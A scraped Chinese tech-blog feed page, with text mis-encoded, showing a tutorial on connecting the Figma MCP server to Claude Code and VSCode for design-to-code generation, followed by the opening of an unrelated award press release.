            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4406498335130216/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸‰é‡‘å¾—é‘«
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T15:49:28.000Z" title="Tue Jan 20 2026 15:49:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å‰æ®µæ—¶é—´ä¸‰é‡‘ç»™å¤§å®¶åˆ†äº«äº†ä¸€æ¬¾å¯ä»¥<strong>æ ¹æ®æˆªå›¾æˆ–è€… URL è‡ªåŠ¨ç”Ÿæˆä»£ç çš„ AI D2C äº§å“â€”â€”ScreenshotToCode</strong>ã€‚å®ƒçš„åŸç†æ˜¯é€šè¿‡å¤šæ¨¡æ€æ¨¡å‹å»åˆ†æå’Œç†è§£ä¸Šä¼ çš„æˆªå›¾ï¼Œç„¶åå†ç”Ÿæˆä»£ç ã€‚æ•´ä¸ªæµç¨‹ç®€å•æ¥è¯´å°±æ˜¯ï¼š<strong>å›¾ç‰‡è¾“å…¥</strong> â†’ <strong>LLMç†è§£</strong> â†’ <strong>ç›´æ¥è¾“å‡ºä»£ç ã€‚</strong></p>
<blockquote>
<p>åŸæ–‡ï¼š<a href="https://juejin.cn/post/7592823500416761882" target="_blank" title="https://juejin.cn/post/7592823500416761882">è™½ç„¶ V0 å¾ˆå¼ºå¤§ï¼Œä½†æ˜¯ ScreenshotToCode ä¾æ—§æœ‰å¸‚åœº</a></p>
</blockquote>
<p>å¬èµ·æ¥å¾ˆç‚«é…·å¯¹å§ï¼Ÿ</p>
<p>ä½†å…¶å®å®ƒæœ‰ä¸€ä¸ª<strong>å¯¹å¼€å‘äººå‘˜æ¥è¯´æ— æ³•å®¹å¿çš„ç¼ºé™·â€”â€”æ— æ³•é›†æˆåˆ°å¼€å‘ç¯å¢ƒä¸­</strong>ï¼ä¹Ÿå°±æ˜¯è¯´å®ƒåªèƒ½ç”Ÿæˆä»¥å•é¡µé¢ä¸ºä¸»çš„ HTML æ–‡ä»¶ã€‚</p>
<p>é‚£æœ‰æ²¡æœ‰å¯ä»¥å’Œå¼€å‘ç¯å¢ƒå®Œç¾é›†æˆçš„å·¥å…·ä»¥åŠæ–¹æ³•å‘¢ï¼Ÿç­”æ¡ˆè‚¯å®šæ˜¯æœ‰çš„ï¼é‚£å°±æ˜¯ Figma MCP + Claude Codeã€‚</p>
<h3 data-id="heading-0">Claude Code + Figma MCP</h3>
<p>é¦–å…ˆï¼Œå‡è®¾ä½ ä»¬å…¬å¸çš„ UI å·²ç»ä½¿ç”¨ Figma è®¾è®¡äº†ä¸€æ¬¾äº§å“è®¾è®¡ç¨¿ï¼Œå¹¶å°†è®¾è®¡ç¨¿é“¾æ¥å‘ç»™äº†ä½ ï¼›</p>
<p>ç„¶åï¼Œç»™ä½ çš„ Claude Code å®‰è£… Figma MCPï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">claude mcp add --transport http figma https://mcp.figma.com/mcp
</code></pre>
<p>å®‰è£…å¥½ä¹‹åæ‰“å¼€ Claude Codeï¼Œå¹¶è¾“å…¥ <code>/mcp</code> é€‰æ‹© figmaï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e7814bfa1fed457489876765da0e8cea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528968&amp;x-signature=HUOnIZ8keAfrcZyzIJK7d4dXDXM%3D" alt="" loading="lazy"/></p>
<p>ç¬¬ä¸€æ¬¡ä½¿ç”¨æ—¶ï¼Œæ˜¯éœ€è¦è¿›è¡Œè®¤è¯çš„ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a71b2ebbbe3749db824ca18b8a337e4f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528968&amp;x-signature=CAfCojnUjZ3lbg78EdpYauD1hyg%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8cf4294c086e402eaddd9bcb2c884614~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528968&amp;x-signature=B2PNf5edadU484gtwthkrdSOM3c%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ef049af0d36a4daf8bb710aaae61e853~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528968&amp;x-signature=ROYQLZZKSedGqcmSSKp%2FUfHlFHQ%3D" alt="" loading="lazy"/></p>
<p>ç‚¹å‡» ã€ŒAgree &amp; Allow Accessã€ æŒ‰é’®å³å¯ï¼ŒæˆåŠŸåä¼šæç¤ºï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5486c2e2987142f5933b34233707aee5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528968&amp;x-signature=YmXadNIASfcjf%2BRXpudgVTWFJf8%3D" alt="" loading="lazy"/></p>
<p>Claude Code ä¸­ä¹Ÿä¼šæœ‰ç›¸åº”çš„æç¤ºï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/85c4c562af9c48c19748bce6e1172a37~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528968&amp;x-signature=wKoJ5H0v3hFAa96hhgDZ7mJEBjk%3D" alt="" loading="lazy"/></p>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦æ‰“å¼€ Figma ä¸­çš„è®¾è®¡ç¨¿ï¼Œå¹¶é€‰ä¸­è¦è®© AI ç”Ÿæˆä»£ç çš„éƒ¨åˆ†ï¼Œå³å‡»å†é€‰ä¸­ã€Œcopy link to selecttionã€ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a68abcd38e9444468364154fdae8e47d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528968&amp;x-signature=QWUjzEygT3hwRfObdRv14%2BgiJ4I%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/06438d2efbe9448cb844c94b064d1099~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528968&amp;x-signature=LS7652Iz%2FGdTOU1fLBld2Yd4AS4%3D" alt="" loading="lazy"/></p>
<p>å›åˆ° Claude Code åæˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œ AI D2C å·¥ä½œäº†ï¼š</p>
<blockquote>
<p>è¾“å…¥æç¤ºè¯ï¼šè¯·ä½¿ç”¨ React + Tailwind CSS ä¸¥æ ¼æŒ‰ç…§è¿™ä¸ªè®¾è®¡ç¨¿ä¸­çš„æ ·å¼å’Œäº¤äº’è¿›è¡Œè¿˜åŸã€‚ã€Œè¿™é‡Œå†å°†åˆšåˆšå¤åˆ¶çš„ Figma Url ç²˜è´´è¿›æ¥ã€</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/30cb543476f54569af81edfe7ccf8e0f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528968&amp;x-signature=8Q%2FLVogeWJIIxho%2BCGW8d9oNQiE%3D" alt="" loading="lazy"/></p>
<p>ç­‰ä¸ªå‡ åˆ†é’Ÿï¼Œä¸€ä¸ªé¡µé¢å°±å·²ç»ç”»å¥½äº†ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a9a9629914d54842a0558358ca750ee0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528968&amp;x-signature=9BoyB%2FfDW1SBCcw4v1A7eOmDe2c%3D" alt="" loading="lazy"/></p>
<p>å¯åŠ¨ä»¥åæ£€æŸ¥äº†ä¸€ä¸‹ï¼Œè¿˜åŸåº¦å¯ä»¥è¯´è¾¾åˆ°äº† 95% ä»¥ä¸Šï¼Œç®€ç›´å®Œç¾ï¼ï¼</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f4417f4beaf94896b8665f163f98a4c9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528968&amp;x-signature=hyEdJqPt4ZvJvP7%2B6aM4X0ngPCo%3D" alt="" loading="lazy"/></p>
<p>å¦å¤–ï¼Œå®˜æ–¹è¿˜æä¾›äº† VSCode å’Œ Cursor çš„ç¤ºä¾‹ï¼Œæ¥éƒ½æ¥äº†ï¼Œæˆ‘ä»¬å†ä¸€èµ·çœ‹ä¸‹ VSCode + Figmaï½</p>
<h3 data-id="heading-1">VSCode + Figma MCP</h3>
<ul>
<li>æŒ‰ä¸‹ Command + Shift + Pï¼Œè¾“å…¥ MCP ä¹‹åä¼šæœ‰ä¸¤ç§è®¾ç½® MCP çš„æ–¹å¼ï¼Œä¸€ç§æ˜¯ç”¨æˆ·çº§åˆ«çš„è®¾ç½®ï¼Œä¸€ç§æ˜¯å·¥ä½œåŒºçº§åˆ«çš„è®¾ç½®ã€‚æˆ‘ä»¬å¯ä»¥ç›´æ¥è®¾ç½®ç”¨æˆ·çº§åˆ«çš„</li>
<li>ç„¶ååœ¨ <code>mcp.json</code> ä¸­ç²˜è´´ä»¥ä¸‹ä»£ç ï¼Œå¹¶ç‚¹å‡»å¯åŠ¨å³å¯è¿›è¡Œè®¤è¯ï¼Œè®¤è¯æˆåŠŸåå¼€å§‹è¿›è¡Œ AI D2Cï¼š</li>
</ul>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
   <span class="hljs-attr">"inputs"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
   <span class="hljs-attr">"servers"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
     <span class="hljs-attr">"figma"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
       <span class="hljs-attr">"url"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"https://mcp.figma.com/mcp"</span><span class="hljs-punctuation">,</span>
       <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"http"</span>
     <span class="hljs-punctuation">}</span>
   <span class="hljs-punctuation">}</span>
 <span class="hljs-punctuation">}</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f4e138a4c8cf450bb8a001a194bd88fe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528968&amp;x-signature=HmOF0lDwKfO%2BIkugIE0E2iK2yZE%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de9069e5ffda4979b5aa60f5ffb88aaf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528968&amp;x-signature=EjXXgTVyHIAqZELW%2FNnCj6vIyM0%3D" alt="" loading="lazy"/></p>
<p>æ‰“å¼€ Github Copilot è¿›è¡Œ AI D2Cï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/831e94e129e342d1acbe4df63ff916b1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528968&amp;x-signature=CH%2F4EnfmK6X6Q41EsXYljbmQKEA%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/67868eb07e00492d84dc5ab7b4d75693~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528968&amp;x-signature=QK52yv7Hby%2BnXRgf3lnXQFG1wrM%3D" alt="" loading="lazy"/></p>
<p>ä¸çŸ¥é“æˆ‘ä¸ä¼šç”¨è¿˜æ˜¯å’‹ï¼ŒGithub Copilot çš„äº§å‡ºç»“æœè®©æˆ‘éš¾ä»¥ç½®ä¿¡ï¼š</p>
<ul>
<li>ä»£ç æ··ä¹±</li>
<li>å¥½å¤š UI éƒ¨åˆ†ç›´æ¥ä½¿ç”¨å›¾å±‚æˆªå›¾æ¥å®ç°çš„ï¼Œæ¯”å¦‚æœç´¢æ¡†ï¼Œä½ æ ¹æœ¬å°±ç‚¹å‡»ä¸äº†</li>
<li>å¸ƒå±€æ··ä¹±ï¼Œåˆ—è¡¨ä¸Šéƒ½å‡ºç°äº†é‡å </li>
</ul>
<p>Agent æ¨¡å¼ä¸‹ä½¿ç”¨çš„æ¨¡å‹æ˜¯ GPT-4.1ï¼Œå“åº”é€Ÿåº¦éå¸¸æ…¢ï¼Œäº§å‡ºç»“æœè¿˜æ˜¯è¿™ä¸ªæ ·å­ï¼Œä½“éªŒç®€ç›´ç³Ÿç³•é€äº†ï¼</p>
<p>è¿˜æ˜¯æ¨èä½¿ç”¨ Claude Code + GLM 4.7 å§ğŸ˜‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æé™ç§‘æŠ€è£è†º 2025 é‡‘çŒ¿å¥– â€” â€œå¹´åº¦å›½äº§åŒ–ä¼˜ç§€ä»£è¡¨å‚å•†â€ï¼Œè‡ªä¸»å¯æ§æœç´¢æ–¹æ¡ˆ Easysearch è·è¡Œä¸šé«˜åº¦è®¤å¯]]></title>    <link>https://juejin.cn/post/7597326073671729167</link>    <guid>https://juejin.cn/post/7597326073671729167</guid>    <pubDate>2026-01-20T15:50:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597326073671729167" data-draft-id="7597270795212423208" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æé™ç§‘æŠ€è£è†º 2025 é‡‘çŒ¿å¥– â€” â€œå¹´åº¦å›½äº§åŒ–ä¼˜ç§€ä»£è¡¨å‚å•†â€ï¼Œè‡ªä¸»å¯æ§æœç´¢æ–¹æ¡ˆ Easysearch è·è¡Œä¸šé«˜åº¦è®¤å¯"/> <meta itemprop="keywords" content="æ•°æ®åº“,æœç´¢å¼•æ“"/> <meta itemprop="datePublished" content="2026-01-20T15:50:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æé™å®éªŒå®¤"/> <meta itemprop="url" content="https://juejin.cn/user/1258294223312599"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æé™ç§‘æŠ€è£è†º 2025 é‡‘çŒ¿å¥– â€” â€œå¹´åº¦å›½äº§åŒ–ä¼˜ç§€ä»£è¡¨å‚å•†â€ï¼Œè‡ªä¸»å¯æ§æœç´¢æ–¹æ¡ˆ Easysearch è·è¡Œä¸šé«˜åº¦è®¤å¯
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1258294223312599/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æé™å®éªŒå®¤
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T15:50:28.000Z" title="Tue Jan 20 2026 15:50:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>è¿‘æ—¥äºä¸Šæµ·æ˜æ·ä¸‡ä¸½é…’åº—æˆåŠŸä¸¾åŠçš„ â€œ<strong>2025 ç¬¬å…«å±Šé‡‘çŒ¿å¤§æ•°æ®äº§ä¸šå‘å±•è®ºå› â€” æš¨ AI Infra &amp; Data Agent è¶‹åŠ¿è®ºå›</strong>â€ å¤§ä¼šä¸Šï¼Œ<strong>æé™æ•°æ®ï¼ˆåŒ—äº¬ï¼‰ç§‘æŠ€æœ‰é™å…¬å¸ï¼ˆä»¥ä¸‹ç®€ç§°â€œæé™ç§‘æŠ€â€ï¼‰</strong> å‡­å€Ÿå…¶åœ¨åˆ†å¸ƒå¼æœç´¢å‹æ•°æ®åº“é¢†åŸŸçš„æŠ€æœ¯çªç ´ä¸å“è¶Šçš„å›½äº§åŒ–å®è·µï¼ŒæˆåŠŸå…¥é€‰ã€Š<strong>2025 